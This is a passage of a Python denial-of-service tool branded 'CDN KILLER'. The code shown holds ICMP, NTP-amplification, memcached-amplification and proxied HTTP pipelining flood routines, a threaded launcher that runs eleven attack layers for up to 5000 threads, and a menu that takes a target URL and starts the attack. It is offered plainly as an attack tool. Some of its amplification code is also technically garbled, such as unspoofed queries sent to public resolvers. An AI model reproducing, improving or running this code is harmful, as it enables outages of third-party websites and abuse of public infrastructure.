                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(1)
                
                packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00'
                packet += b'QUANTUM_ICMP_' + str(random.randint(1,999999)).encode()
                
                sock.sendto(packet, (self.host, 0))
                sock.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 9: NTP AMPLIFICATION — FIXED
    # ============================================================
    def ntp_amplification(self):
        ntp_servers = [
            '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org',
            'time.google.com', 'time.windows.com', 'time.apple.com'
        ]
        while self.running:
            try:
                ntp = random.choice(ntp_servers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                query = b'\x17\x00\x03\x2a' + b'\x00' * 8
                query += b'\x00' * 8 + b'\x00' * 8 + b'\x00' * 8
                
                sock.sendto(query, (ntp, 123))
                sock.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 10: MEMCACHED AMPLIFICATION — FIXED
    # ============================================================
    def memcached_amplification(self):
        memcached_servers = [
            '192.168.1.1', '10.0.0.1', '172.16.0.1',
            '8.8.8.8', '1.1.1.1'
        ]
        while self.running:
            try:
                mem = random.choice(memcached_servers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                query = b'\x00\x00\x00\x00\x00\x01\x00\x00'
                query += b'\x00\x00\x00\x00\x00\x00\x00\x00'
                query += b'\x00\x00\x00\x00\x00\x00\x00\x00'
                query += b'get ' + b'a' * 1000
                
                sock.sendto(query, (mem, 11211))
                sock.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 11: HTTP PIPELINING — FIXED
    # ============================================================
    def http_pipelining(self):
        while self.running:
            try:
                proxy = self.proxy_manager.get()
                
                if self.scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    if proxy:
                        conn = http.client.HTTPSConnection(proxy[0], proxy[1], context=ctx, timeout=5)
                        conn.set_tunnel(self.host, self.port)
                    else:
                        conn = http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=5)
                else:
                    if proxy:
                        conn = http.client.HTTPConnection(proxy[0], proxy[1], timeout=5)
                        conn.set_tunnel(self.host, self.port)
                    else:
                        conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
                
                for i in range(5):
                    path = self.path + '?' + str(random.randint(1,999999)) + '&' + str(i)
                    headers = {
                        'Host': self.host,
                        'User-Agent': self.random_ua(),
                        'Accept': '*/*',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive',
                        'X-Forwarded-For': self.random_ip(),
                    }
                    conn.request('GET', path, headers=headers)
                
                response = conn.getresponse()
                response.read()
                conn.close()
                with self.lock:
                    self.stats['sent'] += 5
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # START ATTACK — ALL LAYERS
    # ============================================================
    def start(self):
        print(f"\n{Colors.BLUE}[*] CDN KILLER ATTACK: {self.target}{Colors.END}")
        print(f"{Colors.DIM}[*] Duration: {self.duration}s | Threads: {self.threads} | Proxies: {self.proxy_manager.count()}{Colors.END}")
        
        layers = [
            self.http2_flood,
            self.http_post_flood,
            self.random_method_flood,
            self.slowloris,
            self.ssl_flood,
            self.udp_flood,
            self.dns_amplification,
            self.icmp_flood,
            self.ntp_amplification,
            self.memcached_amplification,
            self.http_pipelining
        ]
        
        threads = []
        for i in range(self.threads):
            layer = random.choice(layers)
            t = threading.Thread(target=layer, daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.001)
        
        start = time.time()
        while self.running and (time.time() - start) < self.duration:
            time.sleep(1)
            elapsed = time.time() - start
            sent = self.stats['sent']
            failed = self.stats['failed']
            pps = sent / elapsed if elapsed > 0 else 0
            progress = min(100, (elapsed / self.duration) * 100)
            bar = '█' * int(progress // 2) + '░' * (50 - int(progress // 2))
            
            print(f"\r{Colors.RED}[CDN KILLER]{Colors.END} "
                  f"Sent: {Colors.GREEN}{sent:,}{Colors.END} | "
                  f"Failed: {Colors.RED}{failed:,}{Colors.END} | "
                  f"PPS: {Colors.YELLOW}{pps:.0f}{Colors.END} | "
                  f"[{bar}] {progress:.1f}%", end="")
        
        self.running = False
        for t in threads:
            t.join(timeout=1)
        
        print(f"\n\n{Colors.GREEN}[+] Attack Finished!{Colors.END}")

# ============================================================
# MAIN MENU
# ============================================================
def main():
    proxy_manager = ProxyManager()
    
    while True:
        print_banner()
        
        print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║  QUANTUM CDN KILLER — 11 Layer Attack                         ║
╠══════════════════════════════════════════════════════════════╣
║  {Colors.GREEN}1{Colors.END}. 💀 Start CDN Killer Attack                  ║
║  {Colors.GREEN}2{Colors.END}. 🌐 Fetch Proxies (100+ Sources)             ║
║  {Colors.GREEN}3{Colors.END}. 📊 Show Proxy Count                        ║
║  {Colors.GREEN}4{Colors.END}. 🔥 EXIT                                     ║
╚══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.DIM}[*] Proxies: {proxy_manager.count()} | Sources: {len(PROXY_SOURCES)}{Colors.END}")
        
        choice = input(f"\n{Colors.CYAN}[?] Pilih: {Colors.END}")
        
        if choice == '1':
            target = input(f"{Colors.CYAN}[?] Target URL: {Colors.END}")
            if not target.startswith('http'):
                target = 'https://' + target
            
            duration = int(input(f"{Colors.CYAN}[?] Duration (s): {Colors.END}") or 60)
            threads = int(input(f"{Colors.CYAN}[?] Threads: {Colors.END}") or 500)
            
            if threads > 5000:
                threads = 5000
            
            if proxy_manager.count() == 0:
                print(f"{Colors.YELLOW}[!] No proxies! Fetch first (menu 2){Colors.END}")
                continue
            
            confirm = input(f"{Colors.RED}[!] Start CDN KILLER attack? (y/N): {Colors.END}")
            if confirm.lower() != 'y':
                continue
            
            attack = CDNKiller(target, duration, threads, proxy_manager)
            attack.start()
            input(f"\n{Colors.DIM}Press Enter...{Colors.END}")
        
        elif choice == '2':
            proxy_manager.fetch()
            input(f"\n{Colors.DIM}Press Enter...{Colors.END}")
        
        elif choice == '3':
            print(f"{Colors.GREEN}[+] Total Proxies: {proxy_manager.count()}{Colors.END}")
            input(f"\n{Colors.DIM}Press Enter...{Colors.END}")
        
        elif choice == '4':
            print(f"{Colors.RED}[!] Exiting...{Colors.END}")
            sys.exit(0)
        
        else:
            print(f"{Colors.RED}[-] Invalid option{Colors.END}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
        sys.exit(1)